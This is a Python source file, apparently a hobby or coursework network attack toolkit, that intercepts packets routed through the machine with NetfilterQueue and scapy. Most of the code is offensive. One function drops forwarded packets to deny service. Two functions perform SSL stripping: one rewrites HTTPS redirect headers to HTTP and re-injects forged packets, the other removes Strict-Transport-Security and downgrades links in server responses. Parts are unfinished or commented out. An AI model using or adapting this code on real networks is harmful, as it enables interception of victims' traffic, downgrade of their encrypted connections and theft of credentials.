from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap, send 
from networking import *
from netfilterqueue import NetfilterQueue
import requests
import os

class Packet_Handler:
    def __init__(self, file_name: str):
        self.file_name = file_name
        self.pkt_lst = []

    # Input: Scapy Packet
    def add(self, scapy_pkt):
        self.pkt_lst.append(scapy_pkt)
    
    def write_to_file(self):
        with open(self.file_name, 'w') as file:
            # Convert to scapy_packet & write to file
            for i, pkt in enumerate(self.pkt_lst):
                file.write(f"\n--- Packet {i + 1}: " + pkt.summary() + " ---\n")
                file.write(pkt.show(dump=True))
                file.write(f"\n--- Packet {i + 1}: End ---\n")

# Input: Routed packet
# Description: Print & accept packets that are being forwarded through the device
def print_packet(pkt):
    # Get packet payload
    scapy_pkt = IP(pkt.get_payload())
    print(scapy_pkt.show())

# Input: Routed packet
# Description: Deny service by dropping packets on route
def dos(pkt):
    print("Packet dropped: ", pkt)
    pkt.drop()

# Input: Scapy packet
# Return decoded packet raw load
def get_dprl(pkt):
    try: return pkt[Raw].load.decode()
    except: pass

# Input: Routed packet
# Description: Perform SSL Stripping
def ssl_strip(pkt, pkt_handler):
    gateway_ip = get_default_gateway_ip()
    gateway_mac = get_mac_address(gateway_ip)
    
    try:
        scapy_pkt = IP(pkt.get_payload())
        decoded_pkt = scapy_pkt[Raw].load.decode()

        # if TCP in scapy_pkt and scapy_pkt[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load) and scapy_pkt[Ether].dst == gateway_mac:
        '''
        if "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load):
            print("Prev_Load:", scapy_pkt[Raw].load)

            tmp_pkt_load = decoded_pkt.replace("Upgrade-Insecure-Requests: 1", "Upgrade-Insecure-Requests: 0")
            new_pkt_load = tmp_pkt_load.encode()
            # scapy_pkt[Raw].load = new_pkt_load

            # pkt.set_payload(scapy_pkt[Raw].load)
            pkt.set_payload(bytes(new_pkt_load))
        '''
        if "Location: https://" in decoded_pkt:
            print("Prev_Load:", scapy_pkt[Raw].load)

            tmp_pkt_load = decoded_pkt.replace("https://", "http://")

            ip = IP(src=scapy_pkt.src, dst=scapy_pkt.dst)
            tcp = TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt.dport, flags="PA")

            packet = ip/tcp/tmp_pkt_load

            packet[IP].chksum = None
            packet[TCP].chksum = None  

            print("New_Load:", packet)
            print(packet[Raw].load)
            
            pkt_handler.add(packet)
            pkt.drop()
            send(packet)
            
        else:
            pkt_handler.add(scapy_pkt)
            pkt.accept()
            print("New_Load:", pkt.get_payload())
            
    except:
        pkt_handler.add(scapy_pkt)
        pkt.accept()
        print("New_Load:", pkt.get_payload())
        #pass

def ssl_strip_2(pkt, target_ip, pkt_handler):
    # Receive all of the packets from the client

    # send own https request to the server
    # The request IP should be from the AITM

    # Receive the packets from the server

    # Manipulate the server https response
    # Strip strict-transfer-protocol
    # Replace https links with http


    def create_modified_response(response):
        try:
            # Create a new response object based on the original response content
            new_response = requests.Response() # <Response [None]>
            new_response.status_code = response.status_code # Status code! 200
            new_response.url = response.url.replace("https://", "http://") # http://www.server.com/

            
            # Remove the Strict-Transport-Security
            if 'Strict-Transport-Security' in response.headers:
                popped = response.headers.pop('Strict-Transport-Security')
                print(f"Popped 'Strict-Transport-Security: {popped}'")
            else:
                print("'Strict-Transport-Security not found.'")

            # Replace https links with http in the response text
            response_text = response.text.replace("https://", "http://")

            new_response.headers = response.headers
            # print("Headers!", new_response.headers)
            new_response._content = response_text.encode('utf-8')
            # print("_content?!", new_response._content)
        except:
            print("Failed to modify the response...")
            pass

        return new_response

    try:
        scapy_pkt = IP(pkt.get_payload())
        decoded_payload = scapy_pkt[Raw].load.decode()

        '''Capture user packets, send own to server, receive from server, modify response, send to user'''
        if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw) and scapy_pkt[IP].src == target_ip:
            # Extract the raw payload
            print(f"Client Payload: {decoded_payload}")

            # Get the host header url
            host_url = None
            payload_lines = decoded_payload.splitlines()

            for line in payload_lines:
                print(line)
                if line.lower().startswith("host:"):
                    host_url = line.split(":")[1].strip()
                    break
            print(host_url)

            # Send HTTPS request to the server & modify it
            response = requests.get("https://" + host_url)
            print(f"Server Response: {response}")

            print("3.\n")
            new_response = create_modified_response(response)
            print(f"Modified Response: {response}")

            # Print manipulated response (or send it back to the client)
            print("4.\n")
            return new_response
    except:
        pkt.accept()
        pkt_handler.add(scapy_pkt)


# Input: Scapy packet capture
# Description: Creates a packet_log.pcap file & a more detailed packet_log.txt file
def writeCapture(capture):
    print("\nSaving capture...")
    wrpcap("packet_log.pcap", capture)

    with open("packet_log.txt", "w") as text_file:
        for i, packet in enumerate(capture):
            text_file.write(f"\n--- Packet {i + 1}: " + packet.summary() + " ---\n")
            text_file.write(packet.show(dump=True))
            text_file.write(f"\n--- Packet {i + 1}: End ---\n")

# Input: Scapy packet capture
# Description: Displays scapy packet capture
def displayCapture(capture):
    for i, packet in enumerate(capture):
        print(f"\n--- Packet {i + 1}: " + packet.summary() + " ---\n")
        print(packet.show())
        print(f"\n--- Packet {i + 1}: End ---\n")